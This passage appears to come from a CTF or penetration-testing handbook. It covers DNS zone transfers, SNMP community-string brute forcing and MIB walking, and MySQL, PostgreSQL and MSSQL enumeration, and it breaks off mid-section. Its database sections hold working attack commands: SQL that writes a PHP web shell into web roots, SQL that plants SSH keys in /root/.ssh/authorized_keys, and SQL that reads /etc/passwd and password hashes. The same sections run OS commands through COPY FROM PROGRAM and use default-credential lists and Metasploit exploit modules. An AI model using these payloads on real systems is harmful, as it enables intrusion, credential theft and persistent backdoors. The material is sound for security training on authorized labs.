[Unverified] CTF challenges frequently include intentionally misconfigured DNS servers allowing zone transfers as initial reconnaissance vector. Zone transfers in CTF contexts often reveal:

- Hidden subdomains with flags or credentials
- Internal server hostnames hinting at challenge progression
- IP addresses of secondary targets

**Context-specific applications:**

- **Initial reconnaissance:** Single zone transfer yields entire target map
- **Subdomain enumeration:** Eliminates need for brute-forcing if misconfiguration exists
- **Infrastructure mapping:** Internal IP ranges and server purposes
- **Attack surface enumeration:** All potential targets identified immediately
- **Lateral movement planning:** Service topology discovered without individual probes

**Example CTF scenario:**

```bash
# Discover nameservers
nslookup -type=NS example.com

# Attempt zone transfer from each nameserver
for ns in $(dig example.com NS +short); do
  echo "=== Attempting AXFR from $ns ==="
  dig @$ns example.com AXFR
  echo ""
done

# Parse and analyze successful transfer
dig @ns1.example.com example.com AXFR | grep -E "^[a-zA-Z0-9-]+\.example\.com" | \
  awk '{print $1, $NF}' | sort
```

---

### Comprehensive DNS Enumeration Workflow

**Complete reconnaissance combining all DNS enumeration techniques:**

```bash
#!/bin/bash
TARGET="example.com"
WORDLIST="/usr/share/wordlists/subdomains-top1million-110000.txt"

echo "[*] DNS Enumeration for $TARGET"
echo ""

# Phase 1: Nameserver discovery
echo "[+] Phase 1: Discovering authoritative nameservers"
dig $TARGET NS +short > nameservers.txt
cat nameservers.txt

# Phase 2: Zone transfer attempts
echo "[+] Phase 2: Attempting zone transfers"
for ns in $(cat nameservers.txt); do
  echo "  Trying AXFR from $ns..."
  dig @$ns $TARGET AXFR >> zone_transfers.txt 2>/dev/null
done

if grep -q "SOA" zone_transfers.txt; then
  echo "  [!] Zone transfer successful!"
  cat zone_transfers.txt | grep "IN" | awk '{print $1, $NF}' > zone_hosts.txt
else
  echo "  [-] Zone transfer failed (as expected)"
fi

# Phase 3: Comprehensive record queries
echo "[+] Phase 3: Querying all record types"
for type in A AAAA MX NS TXT CNAME SOA PTR; do
  echo "  Querying $type records..."
  dig $TARGET $type +short >> dns_records.txt 2>/dev/null
done

# Phase 4: Subdomain brute-forcing (multiple tools)
echo "[+] Phase 4: Brute-forcing subdomains"
echo "  Running dnsenum..."
dnsenum $TARGET -f $WORDLIST -o dnsenum_results.txt 2>/dev/null

echo "  Running dnsmap..."
dnsmap $TARGET -w $WORDLIST -o dnsmap_results.txt 2>/dev/null

echo "  Running fierce..."
fierce --domain $TARGET --wordlist $WORDLIST --output fierce_results.xml 2>/dev/null

# Phase 5: DNSSEC analysis
echo "[+] Phase 5: DNSSEC analysis"
dig $TARGET +dnssec +short > dnssec_check.txt
dig $TARGET DS >> dnssec_check.txt
dig $TARGET DNSKEY >> dnssec_check.txt

# Phase 6: Consolidate and analyze results
echo "[+] Phase 6: Consolidating results"
cat zone_hosts.txt dnsmap_results.txt dnsenum_results.txt 2>/dev/null | \
  grep -v "^;" | \
  sort -u > all_discovered_hosts.txt

echo ""
echo "[+] Enumeration complete. Results:"
echo "    - Nameservers: $(wc -l < nameservers.txt) found"
echo "    - Zone hosts: $(wc -l < zone_hosts.txt) found (if transfer successful)"
echo "    - Total hosts: $(wc -l < all_discovered_hosts.txt) found"
echo ""
echo "[+] Output files:"
echo "    - nameservers.txt: Authoritative nameservers"
echo "    - zone_transfers.txt: AXFR results"
echo "    - dns_records.txt: All record types"
echo "    - all_discovered_hosts.txt: Complete subdomain list"
echo "    - dnssec_check.txt: DNSSEC configuration"
```

This workflow combines reconnaissance (discovery), exploitation attempts (zone transfers), brute-forcing (multiple tools for comparison), and analysis (record parsing and DNSSEC assessment).

---

## SNMP Enumeration

### SNMP Protocol Fundamentals

SNMP (Simple Network Management Protocol) is a UDP-based protocol used for network device management and monitoring. It operates primarily on UDP ports 161 (queries) and 162 (traps). SNMP uses community strings as authentication tokens, which are transmitted in plaintext in versions 1 and 2c.

**SNMP Versions:**

- **SNMPv1**: Original version, plaintext community strings, no encryption
- **SNMPv2c**: Improved performance, plaintext community strings, widely deployed
- **SNMPv3**: Adds authentication and encryption, less commonly found in CTF environments

**Basic SNMP Detection:**

```bash
# Standard SNMP port scan
nmap -sU -p 161 <target>

# SNMP version detection
nmap -sU -p 161 --script=snmp-info <target>

# Comprehensive SNMP discovery
nmap -sU -p 161,162 -sV <target>

# Fast SNMP scan across subnet
nmap -sU -p 161 --open <subnet>/24
```

### Community Strings

Community strings function as passwords for SNMP access. They control read (public-like) and write (private-like) permissions to the Management Information Base (MIB).

**Common Default Community Strings:**

```bash
# Most common defaults:
public (read-only, most common)
private (read-write)
manager (read-write)
community
snmp
secret
admin
cisco
```

**Community String Types:**

- **Read-only (RO)**: Allows querying device information, cannot modify configuration
- **Read-write (RW)**: Allows both queries and configuration changes, critical for exploitation

**Testing Known Community Strings:**

```bash
# Using snmpwalk with specific community string
snmpwalk -v 2c -c public <target>
snmpwalk -v 2c -c private <target>
snmpwalk -v 2c -c manager <target>

# Using snmpget to test access
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.1.0

# Using nmap for community string validation
nmap -sU -p 161 --script=snmp-brute --script-args snmp-brute.communitiesdb=communities.txt <target>
```

**Custom Community String Wordlists:**

```bash
# Create custom wordlist
cat > snmp_strings.txt <<EOF
public
private
manager
community
snmp
cisco
admin
password
secret
administrator
EOF

# Use with brute force tools
onesixtyone -c snmp_strings.txt <target>
```

### onesixtyone

onesixtyone is a fast SNMP community string scanner that uses efficient techniques to identify valid community strings quickly.

**Basic onesixtyone Usage:**

```bash
# Test single host with default wordlist
onesixtyone <target>

# Test with custom community string list
onesixtyone -c community.txt <target>

# Test multiple hosts from file
onesixtyone -c community.txt -i hosts.txt

# Specify single community string
onesixtyone <target> public
onesixtyone <target> private
```

**Advanced onesixtyone Options:**

```bash
# Verbose output
onesixtyone -d <target>

# Specify wait time (microseconds)
onesixtyone -w 100 <target>

# Test entire subnet
onesixtyone -c community.txt 192.168.1.0/24

# Output results to file
onesixtyone -c community.txt -i hosts.txt -o results.txt
```

**onesixtyone with Multiple Targets:**

```bash
# Create hosts file
cat > targets.txt <<EOF
192.168.1.1
192.168.1.10
192.168.1.100
EOF

# Scan all targets
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt -i targets.txt

# Fast subnet sweep
onesixtyone -c community.txt -i <(seq 1 254 | xargs -I {} echo 192.168.1.{})
```

**Common onesixtyone Workflow:**

```bash
# Step 1: Identify SNMP services
nmap -sU -p 161 --open 192.168.1.0/24 -oG - | awk '/161\/open/{print $2}' > snmp_hosts.txt

# Step 2: Brute force community strings
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt -i snmp_hosts.txt

# Step 3: Verify successful strings
snmpwalk -v 2c -c <found_string> <target>
```

**Example onesixtyone Output:**

```bash
# Successful output format:
# 192.168.1.10 [public] Linux router 3.10.0
# 192.168.1.20 [private] Cisco IOS Software, Version 15.1
```

### snmpwalk

snmpwalk queries the entire SNMP MIB tree or specific OID branches, retrieving all accessible information from the target device.

**Basic snmpwalk Usage:**

```bash
# Walk entire MIB tree (SNMPv1)
snmpwalk -v 1 -c public <target>

# Walk entire MIB tree (SNMPv2c - most common)
snmpwalk -v 2c -c public <target>

# Walk with human-readable output
snmpwalk -v 2c -c public -O n <target>

# SNMPv3 authenticated walk
snmpwalk -v 3 -l authPriv -u username -a SHA -A password -x AES -X privpass <target>
```

**Targeted snmpwalk Queries:**

```bash
# System information
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.1

# Network interfaces
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.2

# Routing table
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.4.21

# ARP cache
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.4.22

# TCP connections
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.6.13

# Running processes (if available)
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.4.2

# Storage information
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.2

# Software installed
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.6.3
```

**snmpwalk Output Control:**

```bash
# Numeric OIDs only
snmpwalk -v 2c -c public -On <target>

# No symbolic names
snmpwalk -v 2c -c public -Oe <target>

# Include units
snmpwalk -v 2c -c public -OU <target>

# Terse output
snmpwalk -v 2c -c public -Ot <target>

# Full output with descriptions
snmpwalk -v 2c -c public -Of <target>
```

**snmpwalk Performance Options:**

```bash
# Limit query depth
snmpwalk -v 2c -c public -Cl <target>

# Set timeout (seconds)
snmpwalk -v 2c -c public -t 10 <target>

# Set retry count
snmpwalk -v 2c -c public -r 3 <target>

# Combine timeout and retry
snmpwalk -v 2c -c public -t 5 -r 2 <target>
```

**Saving snmpwalk Output:**

```bash
# Save complete walk
snmpwalk -v 2c -c public <target> > snmp_walk.txt

# Save specific OID branch
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.1 > system_info.txt

# Save with timestamp
snmpwalk -v 2c -c public <target> | tee snmp_$(date +%Y%m%d_%H%M%S).txt
```

**Using snmpget for Specific Values:**

```bash
# Get single OID value
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.1.0

# Get multiple OID values
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.1.0 1.3.6.1.2.1.1.3.0

# Get system uptime
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.3.0

# Get system name
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.5.0
```

### snmp-check

snmp-check is a comprehensive SNMP enumeration tool that automatically queries common OIDs and presents information in an organized, readable format.

**Basic snmp-check Usage:**

```bash
# Standard enumeration
snmp-check <target>

# Specify community string
snmp-check -c public <target>

# Specify SNMP version
snmp-check -v 1 -c public <target>
snmp-check -v 2c -c public <target>

# Specify port (if non-standard)
snmp-check -p 1161 -c public <target>
```

**snmp-check Output Sections:**

The tool organizes output into categories:

- System information
- User accounts
- Network information and interfaces
- Network IP addresses
- Routing information
- TCP connections and listening ports
- UDP listening ports
- Network services
- Processes
- Storage information
- File system information
- Device information
- Software components

**snmp-check Advanced Options:**

```bash
# Write output to file
snmp-check -c public <target> > snmp_check_output.txt

# Specify timeout
snmp-check -c public -t 10 <target>

# SNMPv3 usage
snmp-check -v 3 -u username -a SHA -A authpass -x AES -X privpass <target>

# Verbose output
snmp-check -c public -d <target>
```

**Parsing snmp-check Output:**

```bash
# Extract user accounts
snmp-check -c public <target> | grep -A 20 "User accounts"

# Extract network interfaces
snmp-check -c public <target> | grep -A 50 "Network interfaces"

# Extract running processes
snmp-check -c public <target> | grep -A 100 "Processes"

# Extract listening ports
snmp-check -c public <target> | grep -E "TCP|UDP" | grep "LISTEN"
```

**snmp-check vs snmpwalk:**

```bash
# snmp-check: Organized, human-readable, automated
snmp-check -c public <target>

# snmpwalk: Raw MIB data, complete information, requires manual parsing
snmpwalk -v 2c -c public <target>

# Best practice: Use both
snmp-check -c public <target> > organized.txt
snmpwalk -v 2c -c public <target> > complete.txt
```

### OID Enumeration

Object Identifiers (OIDs) are hierarchical identifiers used to reference specific data points in the SNMP MIB tree. Understanding common OIDs is essential for targeted enumeration.

**Critical System OIDs:**

```bash
# System Description (OS, version, hardware)
1.3.6.1.2.1.1.1.0
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.1.0

# System Object ID
1.3.6.1.2.1.1.2.0
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.2.0

# System Uptime
1.3.6.1.2.1.1.3.0
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.3.0

# System Contact
1.3.6.1.2.1.1.4.0
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.4.0

# System Name (hostname)
1.3.6.1.2.1.1.5.0
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.5.0

# System Location
1.3.6.1.2.1.1.6.0
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.6.0

# System Services
1.3.6.1.2.1.1.7.0
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.7.0
```

**Network Interface OIDs:**

```bash
# Number of network interfaces
1.3.6.1.2.1.2.1.0
snmpget -v 2c -c public <target> 1.3.6.1.2.1.2.1.0

# Interface descriptions
1.3.6.1.2.1.2.2.1.2
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.2.2.1.2

# Interface types
1.3.6.1.2.1.2.2.1.3
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.2.2.1.3

# Interface speeds
1.3.6.1.2.1.2.2.1.5
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.2.2.1.5

# Interface physical addresses (MAC)
1.3.6.1.2.1.2.2.1.6
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.2.2.1.6

# Interface admin status
1.3.6.1.2.1.2.2.1.7
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.2.2.1.7

# Interface operational status
1.3.6.1.2.1.2.2.1.8
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.2.2.1.8
```

**IP and Routing OIDs:**

```bash
# IP Forwarding enabled
1.3.6.1.2.1.4.1.0
snmpget -v 2c -c public <target> 1.3.6.1.2.1.4.1.0

# IP addresses
1.3.6.1.2.1.4.20.1.1
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.4.20.1.1

# Subnet masks
1.3.6.1.2.1.4.20.1.3
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.4.20.1.3

# Routing table
1.3.6.1.2.1.4.21.1.1
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.4.21.1.1

# Route destinations
1.3.6.1.2.1.4.21.1.1
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.4.21.1.1

# Route next hops
1.3.6.1.2.1.4.21.1.7
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.4.21.1.7

# ARP table (IP to MAC mapping)
1.3.6.1.2.1.4.22.1.2
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.4.22.1.2
```

**TCP Connection OIDs:**

```bash
# TCP connection state
1.3.6.1.2.1.6.13.1.1
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.6.13.1.1

# TCP local addresses
1.3.6.1.2.1.6.13.1.2
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.6.13.1.2

# TCP local ports
1.3.6.1.2.1.6.13.1.3
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.6.13.1.3

# TCP remote addresses
1.3.6.1.2.1.6.13.1.4
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.6.13.1.4

# TCP remote ports
1.3.6.1.2.1.6.13.1.5
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.6.13.1.5
```

**UDP Listening Ports OIDs:**

```bash
# UDP local addresses
1.3.6.1.2.1.7.5.1.1
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.7.5.1.1

# UDP local ports
1.3.6.1.2.1.7.5.1.2
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.7.5.1.2
```

**Process and System Resource OIDs:**

```bash
# Running processes
1.3.6.1.2.1.25.4.2.1.2
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2

# Process paths
1.3.6.1.2.1.25.4.2.1.4
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.4.2.1.4

# Process parameters (command line arguments)
1.3.6.1.2.1.25.4.2.1.5
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.4.2.1.5

# Storage units
1.3.6.1.2.1.25.2.3.1.3
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.2.3.1.3

# Storage allocation units
1.3.6.1.2.1.25.2.3.1.4
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.2.3.1.4

# Storage size
1.3.6.1.2.1.25.2.3.1.5
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.2.3.1.5

# Storage used
1.3.6.1.2.1.25.2.3.1.6
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.2.3.1.6
```

**User Account OIDs (Windows-specific):**

```bash
# User names
1.3.6.1.4.1.77.1.2.25
snmpwalk -v 2c -c public <target> 1.3.6.1.4.1.77.1.2.25
```

**Software and Installed Packages OIDs:**

```bash
# Software names
1.3.6.1.2.1.25.6.3.1.2
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.6.3.1.2

# Software install dates
1.3.6.1.2.1.25.6.3.1.5
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.6.3.1.5
```

**OID Hierarchy Structure:**

```
1.3.6.1.2.1         - MIB-2 (standard SNMP data)
1.3.6.1.2.1.1       - System group
1.3.6.1.2.1.2       - Interfaces group
1.3.6.1.2.1.4       - IP group
1.3.6.1.2.1.6       - TCP group
1.3.6.1.2.1.7       - UDP group
1.3.6.1.2.1.25      - Host Resources MIB
1.3.6.1.4.1         - Private enterprise MIBs
```

**Custom OID Discovery:**

```bash
# Walk entire MIB to discover available OIDs
snmpwalk -v 2c -c public <target> | tee full_mib.txt

# Search for interesting keywords
grep -i "user\|account\|password\|admin" full_mib.txt
grep -i "process\|service\|software" full_mib.txt
grep -i "file\|path\|directory" full_mib.txt

# Extract all OIDs for documentation
snmpwalk -v 2c -c public -On <target> | cut -d' ' -f1 | sort -u > discovered_oids.txt
```

### Nmap SNMP Scripts

Nmap includes comprehensive NSE scripts for SNMP enumeration.

**Basic Nmap SNMP Enumeration:**

```bash
# SNMP system information
nmap -sU -p 161 --script=snmp-info <target>

# SNMP network interfaces
nmap -sU -p 161 --script=snmp-interfaces <target>

# SNMP processes
nmap -sU -p 161 --script=snmp-processes <target>

# SNMP network services
nmap -sU -p 161 --script=snmp-netstat <target>

# SNMP Windows users
nmap -sU -p 161 --script=snmp-win32-users <target>

# SNMP Windows services
nmap -sU -p 161 --script=snmp-win32-services <target>

# SNMP Windows software
nmap -sU -p 161 --script=snmp-win32-software <target>
```

**Comprehensive SNMP Script Scan:**

```bash
# All SNMP scripts
nmap -sU -p 161 --script=snmp-* <target>

# Specific script set with custom community
nmap -sU -p 161 --script=snmp-info,snmp-interfaces,snmp-processes --script-args snmpcommunity=public <target>

# SNMP brute force community strings
nmap -sU -p 161 --script=snmp-brute <target>
nmap -sU -p 161 --script=snmp-brute --script-args snmp-brute.communitiesdb=communities.txt <target>
```

**Nmap SNMP Script Arguments:**

```bash
# Specify community string
nmap -sU -p 161 --script=snmp-info --script-args snmpcommunity=private <target>

# Specify SNMP version
nmap -sU -p 161 --script=snmp-info --script-args snmp.version=1 <target>

# Custom community list for brute force
nmap -sU -p 161 --script=snmp-brute --script-args snmp-brute.communitiesdb=/path/to/list.txt <target>
```

### Metasploit SNMP Modules

**SNMP Login Scanner:**

```bash
msfconsole
use auxiliary/scanner/snmp/snmp_login
set RHOSTS <target>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
run
```

**SNMP Enumeration Module:**

```bash
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS <target>
set COMMUNITY public
run
```

**SNMP Enumeration Shares (Windows):**

```bash
use auxiliary/scanner/snmp/snmp_enumshares
set RHOSTS <target>
set COMMUNITY public
run
```

**SNMP Enumeration Users (Windows):**

```bash
use auxiliary/scanner/snmp/snmp_enumusers
set RHOSTS <target>
set COMMUNITY public
run
```

**SNMP Set (Write Access Required):**

```bash
use auxiliary/scanner/snmp/snmp_set
set RHOSTS <target>
set COMMUNITY private
set OID 1.3.6.1.2.1.1.5.0
set VALUE "pwned"
run
```

### Comprehensive SNMP Enumeration Workflow

**Phase 1: Service Discovery**

```bash
# Identify SNMP services
nmap -sU -p 161 --open <subnet>/24 -oG snmp_hosts.txt

# Extract live SNMP hosts
grep "161/open" snmp_hosts.txt | awk '{print $2}' > targets.txt
```

**Phase 2: Community String Discovery**

```bash
# Fast community string brute force
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt -i targets.txt

# Nmap-based brute force
nmap -sU -p 161 --script=snmp-brute --script-args snmp-brute.communitiesdb=communities.txt <target>

# Metasploit brute force
msfconsole -q -x "use auxiliary/scanner/snmp/snmp_login; set RHOSTS file:targets.txt; run; exit"
```

**Phase 3: Automated Enumeration**

```bash
# Quick organized output
snmp-check -c public <target> > snmp_check_public.txt

# Comprehensive Nmap script scan
nmap -sU -p 161 --script=snmp-info,snmp-interfaces,snmp-processes,snmp-netstat --script-args snmpcommunity=public <target> -oN nmap_snmp.txt
```

**Phase 4: Complete MIB Walk**

```bash
# Full SNMP walk
snmpwalk -v 2c -c public <target> > snmpwalk_full.txt

# Targeted walks for critical data
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.1 > system_info.txt
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.4.2 > processes.txt
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.6.13 > tcp_connections.txt
```

**Phase 5: Data Analysis and Extraction**

```bash
# Extract usernames
grep -i "user\|account" snmpwalk_full.txt

# Extract running processes and paths
grep -E "1.3.6.1.2.1.25.4.2.1.(2|4)" snmpwalk_full.txt

# Extract IP addresses and network info
grep -E "1.3.6.1.2.1.4.(20|21|22)" snmpwalk_full.txt

# Extract listening ports
grep -E "1.3.6.1.2.1.(6.13|7.5)" snmpwalk_full.txt
```

**Phase 6: Exploitation (if RW community found)**

```bash
# Test write access
snmpset -v 2c -c private <target> 1.3.6.1.2.1.1.5.0 s "TestHostname"

# Use Metasploit for advanced exploitation
use auxiliary/scanner/snmp/snmp_set
set COMMUNITY private
set RHOSTS <target>
```

### Critical Information to Extract from SNMP

**High-Value Targets:**

```bash
# User accounts (especially Windows)
snmpwalk -v 2c -c public <target> 1.3.6.1.4.1.77.1.2.25

# Running processes with full paths
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.4.2.1.4

# Network configuration and routing
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.4.21

# Active network connections
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.6.13

# Installed software
snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.25.6.3

# System contact and location (may contain names/addresses)
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.4.0
snmpget -v 2c -c public <target> 1.3.6.1.2.1.1.6.0
```

### Python SNMP Enumeration Script Example

```python
#!/usr/bin/env python3
from pysnmp.hlapi import *

def snmp_get(target, oid, community='public'):
    iterator = getCmd(
        SnmpEngine(),
        CommunityData(community),
        UdpTransportTarget((target, 161)),
        ContextData(),
        ObjectType(ObjectIdentity(oid))
    )
    
    errorIndication, errorStatus, errorIndex, varBinds = next(iterator)
    
    if errorIndication or errorStatus:
        return None
    else:
        for varBind in varBinds:
            return str(varBind[1])

target = "192.168.1.100"
community = "public"

# System information
print(f"[+] System Description: {snmp_get(target, '1.3.6.1.2.1.1.1.0', community)}")
print(f"[+] System Name: {snmp_get(target, '1.3.6.1.2.1.1.5.0', community)}")
print(f"[+] System Contact: {snmp_get(target, '1.3.6.1.2.1.1.4.0', community)}")
print(f"[+] System Location: {snmp_get(target, '1.3.6.1.2.1.1.6.0', community)}")
```

### Important Related Topics

For complete SNMP exploitation proficiency, study:

- **SNMPv3 Authentication Cracking** - Attacking encrypted SNMP implementations
- **SNMP Write Access Exploitation** - Modifying configurations with RW community strings
- **MIB File Analysis** - Understanding vendor-specific MIB structures for targeted enumeration
- **SNMP Trap Analysis** - Passive monitoring of SNMP trap messages for intelligence gathering

---

## Database Service Enumeration

### MySQL/MariaDB (Port 3306)

**Port scanning and version detection:**

```bash
nmap -p 3306 <target>
nmap -p 3306 -sV <target>
nmap -p 3306 -sC -sV <target>
```

**MySQL-specific NSE scripts:**

```bash
nmap -p 3306 --script mysql-info <target>
nmap -p 3306 --script mysql-enum <target>
nmap -p 3306 --script mysql-databases <target>
nmap -p 3306 --script mysql-variables <target>
nmap -p 3306 --script mysql-users <target>
nmap -p 3306 --script mysql-audit <target>
```

**Authentication testing:**

```bash
nmap -p 3306 --script mysql-empty-password <target>
nmap -p 3306 --script mysql-brute <target>
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt <target>
```

**Connecting with mysql client:**

```bash
mysql -h <target> -u root
mysql -h <target> -u root -p
mysql -h <target> -u username -p password
mysql -h <target> -u username -ppassword database_name
```

**Common default credentials:**

- Username: `root`, Password: (empty)
- Username: `root`, Password: `root`
- Username: `admin`, Password: `admin`
- Username: `test`, Password: `test`

**Basic enumeration commands:**

```sql
SELECT version();
SELECT user();
SELECT database();
SHOW DATABASES;
USE database_name;
SHOW TABLES;
DESCRIBE table_name;
SELECT * FROM table_name;
SELECT * FROM mysql.user;
```

**User and privilege enumeration:**

```sql
SELECT User, Host FROM mysql.user;
SELECT user, authentication_string FROM mysql.user;
SELECT user, host, password FROM mysql.user;
SHOW GRANTS;
SHOW GRANTS FOR 'username'@'host';
SELECT * FROM information_schema.user_privileges;
SELECT grantee, privilege_type FROM information_schema.user_privileges;
```

**Reading files (requires FILE privilege):**

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');
SELECT LOAD_FILE('/var/www/html/config.php');
```

**Writing files (requires FILE privilege):**

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT 'SSH_PUBLIC_KEY' INTO OUTFILE '/root/.ssh/authorized_keys';
```

[Inference] File operations require the FILE privilege and may be restricted by the `secure_file_priv` variable, which limits file operations to specific directories.

**Checking privileges:**

```sql
SELECT * FROM mysql.user WHERE User='username'\G
SHOW VARIABLES LIKE 'secure_file_priv';
```

**User-Defined Function (UDF) exploitation:**

[Unverified] UDF exploitation for MySQL typically involves uploading a malicious shared library to the plugin directory and creating functions that execute system commands, but specific implementation varies by MySQL version and operating system.

**Metasploit modules:**

```bash
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/admin/mysql/mysql_enum
use auxiliary/admin/mysql/mysql_sql
use exploit/multi/mysql/mysql_udf_payload
```

### PostgreSQL (Port 5432)

**Port scanning:**

```bash
nmap -p 5432 <target>
nmap -p 5432 -sV -sC <target>
```

**PostgreSQL NSE scripts:**

```bash
nmap -p 5432 --script pgsql-brute <target>
nmap -p 5432 --script pgsql-brute --script-args userdb=users.txt,passdb=passwords.txt <target>
```

**Connecting with psql client:**

```bash
psql -h <target> -U postgres
psql -h <target> -U username -d database_name
psql -h <target> -U postgres -p 5432
psql "postgresql://username:password@target:5432/database"
```

**Common default credentials:**

- Username: `postgres`, Password: `postgres`
- Username: `postgres`, Password: (empty)
- Username: `admin`, Password: `admin`

**Basic enumeration commands:**

```sql
SELECT version();
SELECT current_user;
SELECT current_database();
\l                                    -- List databases
\c database_name                      -- Connect to database
\dt                                   -- List tables
\d table_name                         -- Describe table
\du                                   -- List roles/users
SELECT * FROM pg_user;
SELECT * FROM pg_shadow;
```

**User and privilege enumeration:**

```sql
SELECT usename, usecreatedb, usesuper FROM pg_user;
SELECT rolname, rolsuper, rolcreatedb FROM pg_roles;
\du+
SELECT grantee, privilege_type FROM information_schema.role_table_grants;
```

**Database and schema enumeration:**

```sql
SELECT datname FROM pg_database;
SELECT schema_name FROM information_schema.schemata;
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

**Reading files (requires superuser or specific privileges):**

```sql
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/etc/passwd', 0, 100);
COPY temp FROM '/etc/passwd';
CREATE TABLE temp (data text);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;
```

**Writing files:**

```sql
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

**Command execution (requires superuser):**

```sql
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(data text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;
```

**PostgreSQL large object exploitation:**

```sql
SELECT lo_import('/etc/passwd', 1337);
SELECT lo_get(1337);
SELECT lo_export(1337, '/tmp/exported_file');
```

**Checking for superuser privileges:**

```sql
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
```

**Metasploit modules:**

```bash
use auxiliary/scanner/postgres/postgres_login
use auxiliary/scanner/postgres/postgres_version
use auxiliary/admin/postgres/postgres_sql
use auxiliary/admin/postgres/postgres_readfile
use exploit/linux/postgres/postgres_payload
```

### MSSQL (Port 1433)

**Port scanning:**

```bash
nmap -p 1433 <target>
nmap -p 1433 -sV -sC <target>
nmap -p 1433 --script ms-sql-info <target>
```

**MSSQL NSE scripts:**

```bash
nmap -p 1433 --script ms-sql-info <target>
nmap -p 1433 --script ms-sql-config <target>
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=sa,mssql.password=password <target>
nmap -p 1433 --script ms-sql-empty-password <target>
nmap -p 1433 --script ms-sql-brute <target>
nmap -p 1433 --script ms-sql-ntlm-info <target>
nmap -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=sa <target>
```

**Connecting with mssqlclient (Impacket):**

```bash
mssqlclient.py username@<target>
mssqlclient.py username:password@<target>
mssqlclient.py DOMAIN/username:password@<target>
mssqlclient.py username:password@<target> -windows-auth
mssqlclient.py username:password@<target> -db database_name
```

**Connecting with sqsh:**

```bash
sqsh -S <target> -U username -P password
sqsh -S <target> -U sa -P password
```

**Common default credentials:**

- Username: `sa`, Password: (empty)
- Username: `sa`, Password: `sa`
- Username: `admin`, Password: `admin`

**Basic enumeration commands:**

```sql
SELECT @@version;
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT DB_NAME();
SELECT name FROM master.sys.databases;
SELECT name FROM master.dbo.sysdatabases;
USE database_name;
SELECT * FROM information_schema.tables;
SELECT * FROM table_name;
```

**User and privilege enumeration:**

```sql
